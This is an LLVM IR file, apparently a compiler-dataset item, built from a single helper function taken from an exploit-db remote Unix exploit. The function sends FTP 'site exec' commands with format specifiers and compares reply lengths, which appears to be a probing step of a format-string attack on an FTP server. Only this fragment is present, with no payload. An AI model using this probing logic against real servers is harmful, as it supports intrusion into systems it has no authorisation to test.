; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20030.c_magic_check_o.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20030.c_magic_check_o.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"site exec %s%s\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [16 x i8] c"Line TOO big..\0A\00", align 1
@before_len = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [3 x i8] c"%d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @magic_check_o(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [2048 x i8], align 16
  %7 = alloca [2048 x i8], align 16
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %9 = load i8*, i8** %5, align 8
  %10 = call i32 @snprintf(i8* %8, i32 2048, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8* %9, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %11 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %12 = call i32* @strstr(i8* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %13 = icmp eq i32* %12, null
  br i1 %13, label %14, label %18

14:                                               ; preds = %2
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  %17 = call i32 @exit(i32 -1) #3
  unreachable

18:                                               ; preds = %2
  %19 = load i32, i32* %4, align 4
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %22 = call i64 @strlen(i8* %21)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %24 = call i32 @ftp_siteexec(i32 %19, i8* %20, i64 %22, i32 1, i8* %23, i32 2048)
  %25 = load i64, i64* @before_len, align 8
  %26 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 3
  %27 = call i64 @strlen(i8* %26)
  %28 = icmp eq i64 %25, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %18
  %30 = load i64, i64* @before_len, align 8
  %31 = add nsw i64 %30, 1
  store i64 %31, i64* @before_len, align 8
  %32 = load i8*, i8** %5, align 8
  %33 = call i32 @strcat(i8* %32, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  store i32 3, i32* %3, align 4
  br label %39

34:                                               ; preds = %18
  %35 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 3
  %36 = call i64 @strlen(i8* %35)
  store i64 %36, i64* @before_len, align 8
  %37 = load i8*, i8** %5, align 8
  %38 = call i32 @strcat(i8* %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32 2, i32* %3, align 4
  br label %39

39:                                               ; preds = %34, %29
  %40 = load i32, i32* %3, align 4
  ret i32 %40
}

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*) #1

declare dso_local i32* @strstr(i8*, i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @ftp_siteexec(i32, i8*, i64, i32, i8*, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
